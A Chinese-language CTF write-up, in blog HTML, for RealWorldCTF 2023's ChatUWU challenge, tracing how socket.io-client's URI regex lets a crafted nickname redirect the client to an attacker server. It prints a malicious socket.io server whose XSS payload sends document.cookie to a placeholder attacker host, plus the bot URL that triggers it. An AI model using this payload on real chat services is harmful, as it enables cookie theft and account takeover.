+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112026402.png" title="image-20230111202606370" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112026402.png" alt="image-20230111202606370"></a></p>
+<p>设断点，看代码</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112005675.png" title="image-20230111200523556" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112005675.png" alt="image-20230111200523556"></a></p>
+<p>然后会跳入<code>lookup()</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112011435.png" title="image-20230111201157357" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112011435.png" alt="image-20230111201157357"></a></p>
+<p>可以发现，他在这里调用了<code>Manager()</code>，去官官方文档看看这个是什么意思</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112013466.png" title="image-20230111201350381" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112013466.png" alt="image-20230111201350381"></a></p>
+<p>就是来建立客户端和服务端的连接，进去看看</p>
+<p><code>manager.js</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112048737.png" title="image-20230111204852677" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112048737.png" alt="image-20230111204852677"></a></p>
+<p>this.uri是我们传入的uri,然后会调用this.open()来建立连接</p>
+<p>继续跟进</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112050544.png" title="image-20230111205046485" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112050544.png" alt="image-20230111205046485"></a></p>
+<p>这里是调用Engine函数来实现真正的连接，继续跟进</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112054389.png" title="image-20230111205417337" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112054389.png" alt="image-20230111205417337"></a></p>
+<p>跳入Socket类的构造函数里，这里会解析uri，并取他的host值</p>
+<p>最后建立连接的服务端就是的就是以这个host值作为主机名。看一下前面parse函数是怎么解析的</p>
+<p>最终使用了<code>parse()</code>对uri进行解析</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// imported from https://github.com/galkn/parseuri</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Parses an URI</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Steven Levithan &lt;stevenlevithan.com&gt; (MIT license)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@api</span> <span class="variable">private</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> re = <span class="regexp">/^(?:(?![^:@]+:[^:@\/]*@)(http|https|ws|wss):\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?((?:[a-f0-9]&#123;0,4&#125;:)&#123;2,7&#125;[a-f0-9]&#123;0,4&#125;|[^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/</span>;</span><br><span class="line"><span class="keyword">const</span> parts = [</span><br><span class="line">    <span class="string">&#x27;source&#x27;</span>, <span class="string">&#x27;protocol&#x27;</span>, <span class="string">&#x27;authority&#x27;</span>, <span class="string">&#x27;userInfo&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;port&#x27;</span>, <span class="string">&#x27;relative&#x27;</span>, <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;directory&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;query&#x27;</span>, <span class="string">&#x27;anchor&#x27;</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">parse</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> src = str, b = str.<span class="title function_">indexOf</span>(<span class="string">&#x27;[&#x27;</span>), e = str.<span class="title function_">indexOf</span>(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (b != -<span class="number">1</span> &amp;&amp; e != -<span class="number">1</span>) &#123;</span><br><span class="line">        str = str.<span class="title function_">substring</span>(<span class="number">0</span>, b) + str.<span class="title function_">substring</span>(b, e).<span class="title function_">replace</span>(<span class="regexp">/:/g</span>, <span class="string">&#x27;;&#x27;</span>) + str.<span class="title function_">substring</span>(e, str.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> m = re.<span class="title function_">exec</span>(str || <span class="string">&#x27;&#x27;</span>), uri = &#123;&#125;, i = <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">        uri[parts[i]] = m[i] || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (b != -<span class="number">1</span> &amp;&amp; e != -<span class="number">1</span>) &#123;</span><br><span class="line">        uri.<span class="property">source</span> = src;</span><br><span class="line">        uri.<span class="property">host</span> = uri.<span class="property">host</span>.<span class="title function_">substring</span>(<span class="number">1</span>, uri.<span class="property">host</span>.<span class="property">length</span> - <span class="number">1</span>).<span class="title function_">replace</span>(<span class="regexp">/;/g</span>, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        uri.<span class="property">authority</span> = uri.<span class="property">authority</span>.<span class="title function_">replace</span>(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/;/g</span>, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        uri.<span class="property">ipv6uri</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    uri.<span class="property">pathNames</span> = <span class="title function_">pathNames</span>(uri, uri[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    uri.<span class="property">queryKey</span> = <span class="title function_">queryKey</span>(uri, uri[<span class="string">&#x27;query&#x27;</span>]);</span><br><span class="line">    <span class="keyword">return</span> uri;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pathNames</span>(<span class="params">obj, path</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> regx = <span class="regexp">/\/&#123;2,9&#125;/g</span>, names = path.<span class="title function_">replace</span>(regx, <span class="string">&quot;/&quot;</span>).<span class="title function_">split</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (path.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">1</span>) == <span class="string">&#x27;/&#x27;</span> || path.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">        names.<span class="title function_">splice</span>(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path.<span class="title function_">slice</span>(-<span class="number">1</span>) == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        names.<span class="title function_">splice</span>(names.<span class="property">length</span> - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> names;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">queryKey</span>(<span class="params">uri, query</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> data = &#123;&#125;;</span><br><span class="line">    query.<span class="title function_">replace</span>(<span class="regexp">/(?:^|&amp;)([^&amp;=]*)=?([^&amp;]*)/g</span>, <span class="keyword">function</span> (<span class="params">$0, $1, $2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($1) &#123;</span><br><span class="line">            data[$1] = $2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有很长一段正则匹配,就是利用这里的正则匹配的问题，来使客户端与恶意服务端建立连接</p>
+<p>继续执行一下</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112034316.png" title="image-20230111203400240" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112034316.png" alt="image-20230111203400240"></a></p>
+<p>可以发现会得到14个元素的数组，并将这些元素于parts里的元素一一对应，构成解析后的uri对象</p>
+<p>当使用的uri为<code>http://47.254.28.30:58000/?nickname=guest0423&amp;room=textContent@127.0.0.1:9999</code>时，可以发现host被解析为127.0.0.1，且port为9999。</p>
+<p>（具体为什么，感兴趣的师傅可以研究一下那个正则匹配）</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112115820.png" title="image-20230111211504782" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112115820.png" alt="image-20230111211504782"></a></p>
+<h2 id="0x03-构造恶意服务器"><a href="#0x03-构造恶意服务器" class="headerlink" title="0x03 构造恶意服务器"></a>0x03 构造恶意服务器</h2><p>这样子，我们就可以让客户端和我们的恶意服务端连接，并且发送xss代码，这样当bot访问我们给的url的时候，就会造成xss，获取它的cookie</p>
+<p>恶意服务端，根据题目的服务改一下</p>
+<p><code>evilindex.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)();</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>).<span class="title class_">Server</span>(app);</span><br><span class="line"><span class="keyword">const</span> io = <span class="built_in">require</span>(<span class="string">&#x27;socket.io&#x27;</span>)(http, &#123;<span class="attr">cors</span>: &#123;<span class="attr">origin</span>: <span class="string">&quot;*&quot;</span>&#125;&#125;);<span class="comment">//设置允许跨域</span></span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> hostname = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">9998</span>;</span><br><span class="line"><span class="keyword">const</span> room = <span class="string">&quot;DOMPurify&quot;</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function">(<span class="params">socket</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(socket.<span class="property">handshake</span>.<span class="property">address</span>)</span><br><span class="line">    socket.<span class="title function_">join</span>(room);</span><br><span class="line">    io.<span class="title function_">to</span>(room).<span class="title function_">emit</span>(<span class="string">&#x27;msg&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">from</span>: <span class="string">&quot;pankas&quot;</span>,</span><br><span class="line">        <span class="attr">text</span>: <span class="string">&quot;&lt;img src=1 onerror=&#x27;location.href=`http://&lt;yourhostname&gt;:&lt;yourip&gt;/?flag=$&#123;document.cookie&#125;`&#x27;&gt;&quot;</span>,<span class="comment">//为了稳定触发最好还是用 onerror</span></span><br><span class="line">        <span class="attr">isHtml</span>: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">listen</span>(port, hostname, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`ChatUWU server running at http://<span class="subst">$&#123;hostname&#125;</span>:<span class="subst">$&#123;port&#125;</span>/`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>然后让bot访问</p>
+<p><code>http://47.254.28.30:58000/?room=DOMPurify&amp;nickname=v2i@yourHostname:yourPort</code></p>
+<p>就可以得到flag</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112210841.png" title="image-20230111221009788" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112210841.png" alt="image-20230111221009788"></a></p>
+<h2 id="0xFF"><a href="#0xFF" class="headerlink" title="0xFF"></a>0xFF</h2><p>参考链接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/task/24141">老外的wp</a></li>
+<li><a target="_blank" rel="noopener" href="https://pankas.top/2023/01/09/realworldctf2023-chatuwu/#ChatUWU">pankas师傅</a></li>
+<li><a target="_blank" rel="noopener" href="https://socket.io/">socket.io</a></li>
+</ul>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/CTF/'>
+                            CTF
+                        </a>
+                    
+                        <a href='/tags/WEB/'>
+                            WEB
+                        </a>
+                    
+                        <a href='/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/'>
+                            前端安全
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/WP/'>
+                            WP
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
